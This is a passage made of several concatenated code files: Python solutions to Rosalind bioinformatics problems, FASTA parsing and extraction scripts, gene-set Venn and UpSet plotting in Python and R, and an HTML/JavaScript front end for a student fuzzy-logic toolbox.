    of corresponding symbols that differ in s and t
    See Figure 2.

    Given: Two DNA strings s and t of equal length (not exceeding 1 kbp).

    Return: The Hamming distance dH(s,t).
    Sample Dataset
        GAGCCTACTAACGGGAT
        CATCGTAATGACGGCCT
    Sample Output
        7
"""


def hamming_distance(s, t):
    return sum(a != b for a, b in zip(s, t))


# Sample DNA strings
s = "GAGCCTACTAACGGGAT"
t = "CATCGTAATGACGGCCT"

# Call the function with the sample DNA strings
result = hamming_distance(s, t)

# Print the result
print(result)

"""
The 20 commonly occurring amino acids are abbreviated by using 20 letters from the English alphabet (all letters except for B, J, O, U, X, and Z). Protein strings are constructed from these 20 symbols. Henceforth, the term genetic string will incorporate protein strings along with DNA strings and RNA strings.

The RNA codon table dictates the details regarding the encoding of specific codons into the amino acid alphabet.

Given: An RNA string s

corresponding to a strand of mRNA (of length at most 10 kbp).

Return: The protein string encoded by s

.
Sample Dataset

AUGGCCAUGGCGCCCAGAACUGAGAUCAAUAGUACCCGUAUUAACGGGUGA

Sample Output

MAMAPRTEINSTRING

"""

from Bio.Seq import Seq


def translate_rna_to_protein(rna_string):
    # Convert the RNA string to a Biopython Seq object for easier manipulation
    seq = Seq(rna_string)

    # Translate the RNA sequence into a protein sequence using the RNA codon table
    protein_string = seq.translate()

    # Return the protein string as a regular Python string
    return str(protein_string)


# Sample RNA string
sample_rna_string = "AUGGCCAUGGCGCCCAGAACUGAGAUCAAUAGUACCCGUAUUAACGGGUGA"

# Call the function with the sample RNA string
result = translate_rna_to_protein(sample_rna_string)

# Print the result
print(result)


def total_subsets(n):
    # Calculate the total number of subsets modulo 1,000,000
    total_subsets = 2 ** n % 1_000_000
    return total_subsets

# Sample input value
n = 3

# Call the function with the sample input
result = total_subsets(n)

# Print the result
print(result)


"""
Edit Distance Alignment
url: http://rosalind.info/problems/edta/

Given: Two protein strings s and t in FASTA format (with each string having length at most 1000 aa).
Return: The edit distance dE(s,t) followed by two augmented strings s′ and t′ representing an optimal alignment of s and t.
"""

import pprint
from Bio import SeqIO

def EditDistanceAlignment(s, t):
    m, n = len(s), len(t)
    if m*n==0:
        return m+n
    DP = [[0]*(n+1) for _ in range(m+1)]
    for i in range(m+1):
        DP[i][0] = i
    for j in range(n+1):
        DP[0][j] = j
    for i in range(1, m+1):
        for j in range(1, n+1):
            left = DP[i-1][j] + 1
            down = DP[i][j-1] + 1
            left_down = DP[i-1][j-1]
            if s[i-1] != t[j-1]:
                left_down += 1
            DP[i][j] = min(left, down, left_down)
    # pprint.pprint(DP)
    edit_distance = DP[m][n]
    print(edit_distance)

    s_, t_ = "", ""
    i, j = 0, 0
    i, j = len(s), len(t)
    while (i>0 and j>0):
        left = DP[i][j-1]
        top = DP[i-1][j]
        left_top = DP[i-1][j-1]
        min_ = min(left, top, left_top)
        if DP[i][j]==min_:
            s_ = s[i-1]+s_
            t_ = t[j-1]+t_
            i -= 1
            j -= 1
        else:
            if (min_==left and min_==top) or (min_!=left and min_!=top):
                s_ = s[i-1]+s_
                t_ = t[j-1]+t_
                i -= 1
                j -= 1
            elif min_!=left and min_==top:
                s_ = s[i-1]+s_
                t_ = "-"+t_
                i -= 1
            elif min_==left and min_!=top:
                s_ = "-"+s_
                t_ = t[j-1]+t_
                j -= 1
    print(s_)
    print(t_)
    return DP





seq_name, seq_string = [], []
with open("../data/rosalind_edta.txt", "r") as fa:
        for seq_record in SeqIO.parse(fa, "fasta"):
            seq_name.append(seq_record.name)
            seq_string.append(str(seq_record.seq))
        s, t = seq_string
res = EditDistanceAlignment(s, t)

from Bio import SeqIO
from Bio.SeqUtils import GC

def read_fasta(file_path):
    """
    Read a FASTA file and return the sequences as a list of tuples (sequence_id, sequence).

    Parameters:
        file_path (str): The path to the FASTA file.

    Returns:
        list: List of tuples (sequence_id, sequence).
    """
    sequences = []
    with open(file_path, "r") as fasta_file:
        for record in SeqIO.parse(fasta_file, "fasta"):
            sequences.append((record.id, str(record.seq)))
    return sequences

def fastaqc(sequences):
    """
    Perform FASTAqc on a list of sequences.

    Parameters:
        sequences (list): List of tuples (sequence_id, sequence).

    Returns:
        dict: Dictionary containing sequence statistics.
    """
    stats = {}
    for seq_id, sequence in sequences:
        stats[seq_id] = {
            "Length": len(sequence),
            "GC Content": GC(sequence)
        }
    return stats

# Example usage
fasta_file_path = "example.fasta"
sequences = read_fasta(fasta_file_path)
qc_results = fastaqc(sequences)

# Print FASTAqc results
for seq_id, stats in qc_results.items():
    print(f"Sequence ID: {seq_id}")
    print(f"Length: {stats['Length']}")
    print(f"GC Content: {stats['GC Content']:.2f}%")
    print("--------------")



import glob
import matplotlib.pyplot as plt
import pandas as pd
import venn

path = "nash/"
files = glob.glob(path + "*.txt")
print(len(files))
dictionary = {}

for file in files:
    dataframe = pd.read_csv(file, delim_whitespace=True)
    mySet = set(dataframe["Gene"])
    dataset_label = file.split("\\")[-1].split(".")[0]  # Extract dataset label from the file name
    dictionary[dataset_label] = mySet

venn.venn4(dictionary,names=dictionary.keys())

plt.show()





#!/usr/bin/python
from fastaHandeling import read
class Fasta:
    def __init__(self, filePath):
        self.filePath = filePath
        self.seqs = read(filePath)
        self.LengthInfo = self.calculateLength()
    
    def calculateLength(self):
        lengthInfo = {}
        for seqID in self.seqs:
            lengthInfo[seqID] = len(self.seqs[seqID])
        return lengthInfo
    
    def printSeqs(self):
        for seqID in self.seqs:
            print(seqID)
            print(self.seqs[seqID])


# using Fasta class
fasta = Fasta('sequence.fasta')
#fasta.printSeqs()
for seqID in fasta.LengthInfo:
    print(seqID, fasta.LengthInfo[seqID])

def read(filePath):
    seqs = {}  # Dictionary to store sequences key is SeqID and value is sequence
    seqID=""
    with open(filePath) as f:
        for line in f:
            if line.startswith('>'):
                seqID = line.strip('>').strip()
                seqs[seqID] = ''
            else:
                seqs[seqID] += line.strip()
    return seqs

#!/usr/bin/python
import re
import sys

def extractSeqfromFasta(seqFile, idlist):
    seqDict = dict()
    seqFileContent = open(seqFile, "r").read()
    for id in idlist:
        pattern = re.compile(fr">({id})\s.*\n[A-z\n]+")
        if pattern.search(seqFileContent):
            seqDict[id] = str(pattern.search(seqFileContent).group(0))
            seqDict[id] = re.compile(fr">{id}\s.*\n").sub('', seqDict[id]).replace('\n','')
    return seqDict

def writeSeqs(seqDict,outpath, format = 50):
    with open(outpath, "w") as outfile:
        for id in seqDict:
            seq = seqDict[id]
            # split in 50 format
            seq = [seq[i:i+format] for i in range(0, len(seq), format)]
            outfile.write(f">{id}\n")
            for line in seq:
                outfile.write(f"{line}\n")
    outfile.close()
#!/usr/bin/env python3

# Importing the libraries
import sys
import re
from SeqIO import extractSeqfromFasta, writeSeqs
################## help ##################
if len(sys.argv) == 1:
    print("Usage: python3 FastaFromHammer <HMMEROUT> <seqFile> <outputFile> <outputFileFormat>") 
    print("Author: Moinka H. Adly")
    exit(0)
################## input file ##################
listFile = sys.argv[1]
seqFile = sys.argv[2]

################## output file ##################
outputFile = sys.argv[3]
outputFileFormat = 50
if len(sys.argv) == 5:
    outputFileFormat = sys.argv[4]

################## functions ##################
# This function read the HMMEROUT file and return a list of ids
def readHMMEROUT(filepath):
    patern  = re.compile(r"\w+_\d*.\d")
    idlist=list()
    with open(listFile, "r") as hmmerfile:
        for line in hmmerfile:
            idsfound= patern.findall(line)
            if idsfound:
                for id in idsfound:
                    idlist.append(id)
    hmmerfile.close()
    return idlist


################## main ##################

seqids = readHMMEROUT(listFile)

# Extract the sequences from the seqFile
extractedSeqs = extractSeqfromFasta(seqFile, seqids)
print(extractedSeqs)
#write
writeSeqs(extractedSeqs, outputFile, 100)

#!/usr/bin/python


# Importing the libraries
import sys
import re
from SeqIO import extractSeqfromFasta, writeSeqs
################## help ##################
if len(sys.argv) == 1:
    print("Usage: python3 ExtractListFromFasta <IDsList> <seqFile> <outputFile> <outputFileFormat>")
    exit(0)
# This function read list of IDs and extract from the seqFile (Fasta format) and write it in the outputFile
################## input file ##################
listFile = sys.argv[1]
seqFile = sys.argv[2]
seqFormat = 50
if len(sys.argv) == 5:
    seqFormat = sys.argv[4]

################## output file ##################
outputFile = sys.argv[3]

################## functions ##################
def readList(filepath):
    listofids = list()
    with open(filepath, "r") as listfile:
        for line in listfile:
            listofids.append(line.strip())
    listfile.close()
    return listofids
################## main ##################
idsList = readList(listFile)
# Extract the sequences from the seqFile
extractedSeqs = extractSeqfromFasta(seqFile, idsList)
#write
writeSeqs(extractedSeqs, outputFile, seqFormat)
#!/usr/bin/python


# Importing the libraries
import sys
import re
from SeqIO import extractSeqfromFasta, writeSeqs
################## help ##################
if len(sys.argv) == 1:
    print("Usage: python3 ExtractListFromFasta <IDsList> <seqFile> <outputFile> <outputFileFormat>")
    exit(0)
# This function read list of IDs and extract from the seqFile (Fasta format) and write it in the outputFile
################## input file ##################
listFile = sys.argv[1]
seqFile = sys.argv[2]
seqFormat = 50
if len(sys.argv) == 5:
    seqFormat = sys.argv[4]

################## output file ##################
outputFile = sys.argv[3]

################## functions ##################
def readList(filepath):
    listofids = list()
    with open(filepath, "r") as listfile:
        for line in listfile:
            listofids.append(line.strip())
    listfile.close()
    return listofids
################## main ##################
idsList = readList(listFile)
# Extract the sequences from the seqFile
extractedSeqs = extractSeqfromFasta(seqFile, idsList)
#write
writeSeqs(extractedSeqs, outputFile, seqFormat)

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link type="text/css" rel="stylesheet" href="static/UI.css">
    <!--    <script src="https://cdn.tailwindcss.com"></script>-->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <!--    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>-->
    <title>Fuzzy Logic</title>
</head>
<body style="background-color: antiquewhite">
<header class="mb-5 mt-3">
    <h1 class="h1 display-1 text-center">Fuzzy Logic Toolbox</h1></header>
<main class="container mb-5">
    <div class="row gx-5">
        <form id="form" class="col-6">
            <label class="form-label">Enter Input File</label>
            <input id="file-input" class="form-control mb-5" accept="text/plain" type="file"/>
            <button type="submit" class="btn btn-outline-primary">Do Fuzzy Logic</button>
        </form>
        <div class="col-6 card text-bg-secondary" id="file-viewer">
            <div class="card-header">Input File Format:</div>
            <div class="card-body">
                <h5 class="card-title">Your file should look like below</h5>
                <pre class="card-text">[n: number of variables]
(varName varType varRange varCrispValue)*n
[ns: number of sets in variables]
(setName setType setXCoords)*ns
<-- blank line -->
[nr: number of rules]
(inference rules)*nr

                </pre>
            </div>
        </div>
    </div>
</main>

<footer class="opacity-50 fixed-bottom px-3 py-2 text-light" style="background-color: burlywood">
    <h6 class="h6">Creators</h6>
    <ul class="list-group list-group-horizontal w-25 fs-6 fst-italic">
        <li class="list-group-item">@Amr_Yehia</li>
        <li class="list-group-item">@Omnia_Mohamed</li>
        <li class="list-group-item">@Yomna_Farid</li>
        <li class="list-group-item">@Yusef_Ahmed</li>
    </ul>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
        crossorigin="anonymous"></script>
<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="static/UI.js"></script>
</body>
</html>

header {

}
window.addEventListener('load', main)

function main() {
    console.log('Here we go!')
}

let store = {};
let defaults = {
    text: "[n: number of variables]\n" +
        "(varName varType varRange varCrispValue)*n\n" +
        "[ns: number of sets in variables]\n" +
        "(setName setType setXCoords)*ns\n" +
        "<-- blank line -->\n" +
        "[nr: number of rules]\n" +
        "(inference rules)*nr\n" +
        "                \n" +
        "                ",
    title: "Your file should look like below",
    header: "Input File Format:"
}

document.getElementById('form').onsubmit = submitFile;
function submitFile(e) {
    e.preventDefault()
    if (!store.fileName) {
        return false
    }

    const input = document.getElementById('file-input')
    const formData = new FormData()
    formData.append('input_file', input.files[0])
    axios.put('http://127.0.0.1:5000/runFyzzy', formData).then(res => {
        readFile(new File([res.data], 'output.txt'), true)

        const temp = window.URL.createObjectURL(new Blob([res.data]));
        const link = document.createElement('a');
        link.href = temp;
        link.setAttribute('download', 'output.txt');
        document.body.appendChild(link);
        link.click();
    })


    return false
}

document.getElementById('file-input').oninput = (e) => {
    store.fileName = e.target.value;
    return readFile(e.target.files[0])
}

const readFile = (file, output=false) => {
    const fileViewer = document.querySelector('#file-viewer')
    const header = fileViewer.querySelector('.card-header')
    const title = fileViewer.querySelector('.card-title')
    const text = fileViewer.querySelector('.card-text')

    if (!file) {
        if (store !== {}) {
            header.innerHTML = defaults.header;
            title.innerHTML = defaults.title;
            text.innerHTML = defaults.text;
            store.fileName = '';
        }

        return false
    }

    const reader = new FileReader()
    reader.onload = () => {
        const file_text = reader.result
        text.innerHTML = String(file_text)
        header.innerHTML = output ? 'Output File:' : 'Input File:';
        title.innerHTML = output ? 'Generated file\'s content' : 'Selected file\'s content';
    }
    reader.readAsText(file)
}




library(UpSetR)
a <- read.table('upset/a.CJ_WT.over.WT_Ctrl.txt',header = T)
b <- read.table('upset/b.Car_Ctrl.over.WT_Ctrl.txt',header = T)
c <- read.table('upset/c.CJ_Carover.WT_Ctrl.txt',header = T)
listInput <- list(one=a$Gene,two=b$Gene,three=c$Gene)
upset(
  fromList(listInput),keep.order = T, sets = c("one", "two", "three"),
  queries = list(list(query = intersects, 
                      params = list("one"),color = "red",active=T),
                 list(query = intersects, 
                      params = list("two"),color = "blue",active=T),
                 list(query = intersects, 
                      params = list("three"),color = "green",active=T)
  ),point.size = 6,matrix.color = 'black')
